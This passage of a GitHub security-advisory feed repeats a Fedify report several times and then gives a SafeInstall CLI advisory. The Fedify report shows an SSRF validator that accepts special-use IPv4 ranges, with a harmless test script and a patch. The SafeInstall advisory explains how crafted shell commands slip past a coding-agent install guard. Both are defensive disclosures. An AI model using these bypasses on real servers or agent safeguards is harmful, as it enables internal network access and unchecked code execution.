<p>This is best understood as an incomplete fix/bypass class for the previous SSRF/internal-network-access advisory GHSA-p9cg-vqcc-grcx.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Avoid using a small manual denylist for public IP validation. Instead, validate that the resolved address is globally routable/public.</p>
<p>At minimum, IPv4 validation should reject all relevant special-use ranges, including:</p>
<pre><code>0.0.0.0/8
10.0.0.0/8
100.64.0.0/10
127.0.0.0/8
169.254.0.0/16
172.16.0.0/12
192.0.0.0/24
192.0.2.0/24
192.168.0.0/16
198.18.0.0/15
198.51.100.0/24
203.0.113.0/24
224.0.0.0/4
240.0.0.0/4
</code></pre>
<p>A safer long-term fix would be to use a maintained IP address classification library that explicitly supports security-sensitive public/global IP validation.</p>
<p>Patch Idea</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".").map((part) =&gt; parseInt(part, 10));

  if (
    parts.length !== 4 ||
    parts.some((part) =&gt; Number.isNaN(part) || part &lt; 0 || part &gt; 255)
  ) {
    return false;
  }

  const [a, b] = parts;

  if (a === 0) return false;
  if (a === 10) return false;
  if (a === 100 &amp;&amp; b &gt;= 64 &amp;&amp; b &lt;= 127) return false;
  if (a === 127) return false;
  if (a === 169 &amp;&amp; b === 254) return false;
  if (a === 172 &amp;&amp; b &gt;= 16 &amp;&amp; b &lt;= 31) return false;
  if (a === 192 &amp;&amp; b === 0) return false;
  if (a === 192 &amp;&amp; b === 168) return false;
  if (a === 198 &amp;&amp; (b === 18 || b === 19)) return false;
  if (a === 198 &amp;&amp; b === 51) return false;
  if (a === 203 &amp;&amp; b === 0) return false;
  if (a &gt;= 224) return false;

  return true;
}
</code></pre>
<h2 id="advisory-classification-note">Advisory Classification Note</h2>
<p>I understand this may be classified either as a new advisory or as an update/incomplete fix for GHSA-p9cg-vqcc-grcx. Since the issue appears to affect the validation logic added after the original SSRF fix, and because the affected code is part of the current security boundary for outbound URL fetching, I wanted to report it privately for maintainer review.</p>
<h2 id="disclosure-note">Disclosure Note</h2>
<p>This report does not attempt to access any real internal network service. The proof focuses on the validation decision itself: multiple non-public or special-use IPv4 ranges are accepted as public by the current SSRF protection logic.</p>
<h2 id="researcher">Researcher</h2>
<p>Reported by Chaitanya Garware.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50131">https://nvd.nist.gov/vuln/detail/CVE-2026-50131</a></li>
<li><a href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-14T18:15:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Fedify has an incomplete SSRF mitigation after GHSA-p9cg-vqcc-grcx: validatePublicUrl allows special-use IPv4 ranges]]></title>
        <id>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</id>
        <link href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8"/>
        <updated>2026-07-14T18:15:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Fedify previously addressed SSRF/internal network access in GHSA-p9cg-vqcc-grcx by adding public URL validation before runtime document and media fetching. However, the current IPv4 validation logic appears incomplete.</p>
<p>The <code>validatePublicUrl()</code> protection relies on <code>isValidPublicIPv4Address()</code> to reject non-public IPv4 destinations. The function blocks common private and local ranges such as <code>10.0.0.0/8</code>, <code>127.0.0.0/8</code>, <code>169.254.0.0/16</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>, but it still treats several special-use, reserved, multicast, benchmarking, and carrier-grade NAT IPv4 ranges as valid public destinations.</p>
<p>Because this validation is used as an SSRF defense before outbound fetches, this appears to be an incomplete mitigation or bypass class for the previous SSRF issue.</p>
<p>I tested this against the current repository code at unreleased version 2.3.0. I used <code>&gt;=0.11.2, &lt;=2.2.3</code> as the suspected affected range because 0.11.2 is listed as a patched version for GHSA-p9cg-vqcc-grcx, and this report concerns the post-fix validation logic. Maintainers may adjust the exact affected range.</p>
<h3 id="why-this-is-not-a-duplicate-of-ghsa-p9cg-vqcc-grcx">Why this is not a duplicate of GHSA-p9cg-vqcc-grcx</h3>
<p>GHSA-p9cg-vqcc-grcx covered the original behavior where Fedify fetched ActivityPub object, activity, document, and media URLs without first ensuring that the resolved destination was public.</p>
<p>This report is about the post-fix validation logic. The current mitigation now performs public URL/IP validation, but the IPv4 classification is incomplete and still treats several special-use ranges as public. Therefore, this is a potential incomplete fix/bypass of the previous SSRF mitigation rather than a re-report of the original issue.</p>
<p>The affected behavior appears to exist in the patched/current code path, not only in versions listed as vulnerable in the original advisory.</p>
<h3 id="affected-code">Affected Code</h3>
<p>Affected file:</p>
<p><code>packages/vocab-runtime/src/url.ts</code></p>
<p>Current IPv4 validation logic:</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".");
  const first = parseInt(parts[0]);
  if (first === 0 || first === 10 || first === 127) return false;
  const second = parseInt(parts[1]);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;
  return true;
}
</code></pre>
<p>The important point is that the bypass exists in the mitigation logic itself: the function responsible for deciding whether a destination is public returns true for address ranges that are not globally routable public internet destinations.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>I reproduced the IPv4 validation behavior using the same logic:</p>
<pre><code class="language-ts">function isValidPublicIPv4Address(address) {
  const parts = address.split(".");
  const first = parseInt(parts[0], 10);
  if (first === 0 || first === 10 || first === 127) return false;

  const second = parseInt(parts[1], 10);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;

  return true;
}

const tests = [
  "8.8.8.8",
  "127.0.0.1",
  "10.0.0.1",
  "192.168.1.1",
  "169.254.169.254",
  "100.64.0.1",
  "198.18.0.1",
  "224.0.0.1",
  "240.0.0.1",
  "192.0.0.1",
  "192.0.2.1",
  "198.51.100.1",
  "203.0.113.1"
];

for (const ip of tests) {
  console.log(ip + " =&gt; " + isValidPublicIPv4Address(ip));
}
</code></pre>
<p>Observed output:</p>
<pre><code>8.8.8.8 =&gt; true
127.0.0.1 =&gt; false
10.0.0.1 =&gt; false
192.168.1.1 =&gt; false
169.254.169.254 =&gt; false
100.64.0.1 =&gt; true
198.18.0.1 =&gt; true
224.0.0.1 =&gt; true
240.0.0.1 =&gt; true
192.0.0.1 =&gt; true
192.0.2.1 =&gt; true
198.51.100.1 =&gt; true
203.0.113.1 =&gt; true
</code></pre>
<p>The validator correctly blocks some common private and local ranges, but incorrectly allows multiple special-use ranges.</p>
<h3 id="examples-of-incorrectly-allowed-ranges">Examples of incorrectly allowed ranges</h3>
<p>Important examples include:</p>
<pre><code>100.64.0.0/10 Carrier-grade NAT
198.18.0.0/15 Benchmarking / internal testing networks
224.0.0.0/4 Multicast
240.0.0.0/4 Reserved
192.0.0.0/24 IETF protocol assignments
</code></pre>
<p>Additional correctness examples:</p>
<pre><code>192.0.2.0/24 Documentation range
198.51.100.0/24 Documentation range
203.0.113.0/24 Documentation range
</code></pre>
<h2 id="security-impact">Security Impact</h2>
<p>Any Fedify feature that accepts or processes remote ActivityPub object, activity, document, or media URLs and relies on validatePublicUrl() as an SSRF protection boundary may incorrectly allow outbound requests to special-use IPv4 destinations that should not be treated as public internet resources.</p>
<p>This may allow an attacker-controlled ActivityPub object or media URL to cause a Fedify server to initiate requests to non-public or special-use network ranges, depending on the deployment environment and network routing.</p>
<p>This is best understood as an incomplete fix/bypass class for the previous SSRF/internal-network-access advisory GHSA-p9cg-vqcc-grcx.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Avoid using a small manual denylist for public IP validation. Instead, validate that the resolved address is globally routable/public.</p>
<p>At minimum, IPv4 validation should reject all relevant special-use ranges, including:</p>
<pre><code>0.0.0.0/8
10.0.0.0/8
100.64.0.0/10
127.0.0.0/8
169.254.0.0/16
172.16.0.0/12
192.0.0.0/24
192.0.2.0/24
192.168.0.0/16
198.18.0.0/15
198.51.100.0/24
203.0.113.0/24
224.0.0.0/4
240.0.0.0/4
</code></pre>
<p>A safer long-term fix would be to use a maintained IP address classification library that explicitly supports security-sensitive public/global IP validation.</p>
<p>Patch Idea</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".").map((part) =&gt; parseInt(part, 10));

  if (
    parts.length !== 4 ||
    parts.some((part) =&gt; Number.isNaN(part) || part &lt; 0 || part &gt; 255)
  ) {
    return false;
  }

  const [a, b] = parts;

  if (a === 0) return false;
  if (a === 10) return false;
  if (a === 100 &amp;&amp; b &gt;= 64 &amp;&amp; b &lt;= 127) return false;
  if (a === 127) return false;
  if (a === 169 &amp;&amp; b === 254) return false;
  if (a === 172 &amp;&amp; b &gt;= 16 &amp;&amp; b &lt;= 31) return false;
  if (a === 192 &amp;&amp; b === 0) return false;
  if (a === 192 &amp;&amp; b === 168) return false;
  if (a === 198 &amp;&amp; (b === 18 || b === 19)) return false;
  if (a === 198 &amp;&amp; b === 51) return false;
  if (a === 203 &amp;&amp; b === 0) return false;
  if (a &gt;= 224) return false;

  return true;
}
</code></pre>
<h2 id="advisory-classification-note">Advisory Classification Note</h2>
<p>I understand this may be classified either as a new advisory or as an update/incomplete fix for GHSA-p9cg-vqcc-grcx. Since the issue appears to affect the validation logic added after the original SSRF fix, and because the affected code is part of the current security boundary for outbound URL fetching, I wanted to report it privately for maintainer review.</p>
<h2 id="disclosure-note">Disclosure Note</h2>
<p>This report does not attempt to access any real internal network service. The proof focuses on the validation decision itself: multiple non-public or special-use IPv4 ranges are accepted as public by the current SSRF protection logic.</p>
<h2 id="researcher">Researcher</h2>
<p>Reported by Chaitanya Garware.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50131">https://nvd.nist.gov/vuln/detail/CVE-2026-50131</a></li>
<li><a href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-14T18:15:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Fedify has an incomplete SSRF mitigation after GHSA-p9cg-vqcc-grcx: validatePublicUrl allows special-use IPv4 ranges]]></title>
        <id>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</id>
        <link href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8"/>
        <updated>2026-07-14T18:15:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Fedify previously addressed SSRF/internal network access in GHSA-p9cg-vqcc-grcx by adding public URL validation before runtime document and media fetching. However, the current IPv4 validation logic appears incomplete.</p>
<p>The <code>validatePublicUrl()</code> protection relies on <code>isValidPublicIPv4Address()</code> to reject non-public IPv4 destinations. The function blocks common private and local ranges such as <code>10.0.0.0/8</code>, <code>127.0.0.0/8</code>, <code>169.254.0.0/16</code>, <code>172.16.0.0/12</code>, and <code>192.168.0.0/16</code>, but it still treats several special-use, reserved, multicast, benchmarking, and carrier-grade NAT IPv4 ranges as valid public destinations.</p>
<p>Because this validation is used as an SSRF defense before outbound fetches, this appears to be an incomplete mitigation or bypass class for the previous SSRF issue.</p>
<p>I tested this against the current repository code at unreleased version 2.3.0. I used <code>&gt;=0.11.2, &lt;=2.2.3</code> as the suspected affected range because 0.11.2 is listed as a patched version for GHSA-p9cg-vqcc-grcx, and this report concerns the post-fix validation logic. Maintainers may adjust the exact affected range.</p>
<h3 id="why-this-is-not-a-duplicate-of-ghsa-p9cg-vqcc-grcx">Why this is not a duplicate of GHSA-p9cg-vqcc-grcx</h3>
<p>GHSA-p9cg-vqcc-grcx covered the original behavior where Fedify fetched ActivityPub object, activity, document, and media URLs without first ensuring that the resolved destination was public.</p>
<p>This report is about the post-fix validation logic. The current mitigation now performs public URL/IP validation, but the IPv4 classification is incomplete and still treats several special-use ranges as public. Therefore, this is a potential incomplete fix/bypass of the previous SSRF mitigation rather than a re-report of the original issue.</p>
<p>The affected behavior appears to exist in the patched/current code path, not only in versions listed as vulnerable in the original advisory.</p>
<h3 id="affected-code">Affected Code</h3>
<p>Affected file:</p>
<p><code>packages/vocab-runtime/src/url.ts</code></p>
<p>Current IPv4 validation logic:</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".");
  const first = parseInt(parts[0]);
  if (first === 0 || first === 10 || first === 127) return false;
  const second = parseInt(parts[1]);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;
  return true;
}
</code></pre>
<p>The important point is that the bypass exists in the mitigation logic itself: the function responsible for deciding whether a destination is public returns true for address ranges that are not globally routable public internet destinations.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<p>I reproduced the IPv4 validation behavior using the same logic:</p>
<pre><code class="language-ts">function isValidPublicIPv4Address(address) {
  const parts = address.split(".");
  const first = parseInt(parts[0], 10);
  if (first === 0 || first === 10 || first === 127) return false;

  const second = parseInt(parts[1], 10);
  if (first === 169 &amp;&amp; second === 254) return false;
  if (first === 172 &amp;&amp; second &gt;= 16 &amp;&amp; second &lt;= 31) return false;
  if (first === 192 &amp;&amp; second === 168) return false;

  return true;
}

const tests = [
  "8.8.8.8",
  "127.0.0.1",
  "10.0.0.1",
  "192.168.1.1",
  "169.254.169.254",
  "100.64.0.1",
  "198.18.0.1",
  "224.0.0.1",
  "240.0.0.1",
  "192.0.0.1",
  "192.0.2.1",
  "198.51.100.1",
  "203.0.113.1"
];

for (const ip of tests) {
  console.log(ip + " =&gt; " + isValidPublicIPv4Address(ip));
}
</code></pre>
<p>Observed output:</p>
<pre><code>8.8.8.8 =&gt; true
127.0.0.1 =&gt; false
10.0.0.1 =&gt; false
192.168.1.1 =&gt; false
169.254.169.254 =&gt; false
100.64.0.1 =&gt; true
198.18.0.1 =&gt; true
224.0.0.1 =&gt; true
240.0.0.1 =&gt; true
192.0.0.1 =&gt; true
192.0.2.1 =&gt; true
198.51.100.1 =&gt; true
203.0.113.1 =&gt; true
</code></pre>
<p>The validator correctly blocks some common private and local ranges, but incorrectly allows multiple special-use ranges.</p>
<h3 id="examples-of-incorrectly-allowed-ranges">Examples of incorrectly allowed ranges</h3>
<p>Important examples include:</p>
<pre><code>100.64.0.0/10 Carrier-grade NAT
198.18.0.0/15 Benchmarking / internal testing networks
224.0.0.0/4 Multicast
240.0.0.0/4 Reserved
192.0.0.0/24 IETF protocol assignments
</code></pre>
<p>Additional correctness examples:</p>
<pre><code>192.0.2.0/24 Documentation range
198.51.100.0/24 Documentation range
203.0.113.0/24 Documentation range
</code></pre>
<h2 id="security-impact">Security Impact</h2>
<p>Any Fedify feature that accepts or processes remote ActivityPub object, activity, document, or media URLs and relies on validatePublicUrl() as an SSRF protection boundary may incorrectly allow outbound requests to special-use IPv4 destinations that should not be treated as public internet resources.</p>
<p>This may allow an attacker-controlled ActivityPub object or media URL to cause a Fedify server to initiate requests to non-public or special-use network ranges, depending on the deployment environment and network routing.</p>
<p>This is best understood as an incomplete fix/bypass class for the previous SSRF/internal-network-access advisory GHSA-p9cg-vqcc-grcx.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Avoid using a small manual denylist for public IP validation. Instead, validate that the resolved address is globally routable/public.</p>
<p>At minimum, IPv4 validation should reject all relevant special-use ranges, including:</p>
<pre><code>0.0.0.0/8
10.0.0.0/8
100.64.0.0/10
127.0.0.0/8
169.254.0.0/16
172.16.0.0/12
192.0.0.0/24
192.0.2.0/24
192.168.0.0/16
198.18.0.0/15
198.51.100.0/24
203.0.113.0/24
224.0.0.0/4
240.0.0.0/4
</code></pre>
<p>A safer long-term fix would be to use a maintained IP address classification library that explicitly supports security-sensitive public/global IP validation.</p>
<p>Patch Idea</p>
<pre><code class="language-ts">export function isValidPublicIPv4Address(address: string): boolean {
  const parts = address.split(".").map((part) =&gt; parseInt(part, 10));

  if (
    parts.length !== 4 ||
    parts.some((part) =&gt; Number.isNaN(part) || part &lt; 0 || part &gt; 255)
  ) {
    return false;
  }

  const [a, b] = parts;

  if (a === 0) return false;
  if (a === 10) return false;
  if (a === 100 &amp;&amp; b &gt;= 64 &amp;&amp; b &lt;= 127) return false;
  if (a === 127) return false;
  if (a === 169 &amp;&amp; b === 254) return false;
  if (a === 172 &amp;&amp; b &gt;= 16 &amp;&amp; b &lt;= 31) return false;
  if (a === 192 &amp;&amp; b === 0) return false;
  if (a === 192 &amp;&amp; b === 168) return false;
  if (a === 198 &amp;&amp; (b === 18 || b === 19)) return false;
  if (a === 198 &amp;&amp; b === 51) return false;
  if (a === 203 &amp;&amp; b === 0) return false;
  if (a &gt;= 224) return false;

  return true;
}
</code></pre>
<h2 id="advisory-classification-note">Advisory Classification Note</h2>
<p>I understand this may be classified either as a new advisory or as an update/incomplete fix for GHSA-p9cg-vqcc-grcx. Since the issue appears to affect the validation logic added after the original SSRF fix, and because the affected code is part of the current security boundary for outbound URL fetching, I wanted to report it privately for maintainer review.</p>
<h2 id="disclosure-note">Disclosure Note</h2>
<p>This report does not attempt to access any real internal network service. The proof focuses on the validation decision itself: multiple non-public or special-use IPv4 ranges are accepted as public by the current SSRF protection logic.</p>
<h2 id="researcher">Researcher</h2>
<p>Reported by Chaitanya Garware.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/fedify-dev/fedify/security/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50131">https://nvd.nist.gov/vuln/detail/CVE-2026-50131</a></li>
<li><a href="https://github.com/advisories/GHSA-xw9q-2mv6-9fr8">https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw9q-2mv6-9fr8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-14T18:15:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[safeinstall-cli] SafeInstall agent guard shell parsing can miss raw package execution]]></title>
        <id>https://github.com/advisories/GHSA-xrmc-c5cg-rv7x</id>
        <link href="https://github.com/advisories/GHSA-xrmc-c5cg-rv7x"/>
        <updated>2026-07-10T19:34:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>SafeInstall CLI through 0.10.1 can fail to recognize some package-manager and registry-runner commands in its agent guard. Case-variant launcher names, leading file-descriptor redirections, and supported shell wrappers with options can cause a raw install command to receive no guard decision. Remote project scaffolding through package-manager create/init commands can also avoid the approval decision used for other registry runners.</p>
<h2 id="impact">Impact</h2>
<p>When the SafeInstall guard is installed for a coding agent, a crafted shell command can bypass the intended deny or ask response. The coding agent may then run a package installation or registry-provided scaffolding command without SafeInstall policy evaluation and without SafeInstall enforcing disabled lifecycle scripts.</p>
<p>Exploitation requires a coding agent to act on attacker-influenced instructions and issue the crafted shell command. A successful malicious package or runner can execute with the permissions of the developer account, affecting the confidentiality, integrity, and availability of local source code, credentials, and development resources.</p>
<p>The vulnerability is limited to guard interception. Commands already routed through the SafeInstall CLI continue to receive normal policy evaluation.</p>
<h2 id="affected-versions">Affected versions</h2>
<ul>
<li>safeinstall-cli &lt;= 0.10.1</li>
</ul>
<h2 id="patched-version">Patched version</h2>
<ul>
<li>safeinstall-cli 0.10.2</li>
</ul>
<h2 id="fix">Fix</h2>
<p>Version 0.10.2:</p>
<ul>
<li>normalizes package-manager and wrapper launcher names for detection and rewriting;</li>
<li>parses leading redirections before classifying the command;</li>
<li>handles supported wrapper option arity conservatively and fails closed on ambiguous embedded command syntax;</li>
<li>routes remote create/init scaffolding through the registry-runner approval path;</li>
<li>preserves SafeInstall routing for path-qualified package-manager invocations.</li>
</ul>
<p>The patch includes a permanent regression corpus, table-driven parser characterization, an independent reference detector, and deterministic fuzz invariants. The integrated release candidate passed 626 tests, package smoke validation, and a one-million-command fuzz campaign with zero invariant violations.</p>
<h2 id="mitigation">Mitigation</h2>
<p>Upgrade to safeinstall-cli 0.10.2 or later.</p>
<p>Until an upgrade is possible, manually review every coding-agent shell command and prevent the agent from invoking package managers or registry runners directly. Running an affected guard does not make raw package-manager execution safe.</p>
<h2 id="credits">Credits</h2>
<p>Discovered, reproduced, and remediated by the SafeInstall maintainer during adversarial parser testing.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Mickdownunder/SafeInstall/security/advisories/GHSA-xrmc-c5cg-rv7x">https://github.com/Mickdownunder/SafeInstall/security/advisories/GHSA-xrmc-c5cg-rv7x</a></li>
<li><a href="https://github.com/advisories/GHSA-xrmc-c5cg-rv7x">https://github.com/advisories/GHSA-xrmc-c5cg-rv7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xrmc-c5cg-rv7x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-10T19:34:14.000Z</published>
    </entry>
</feed>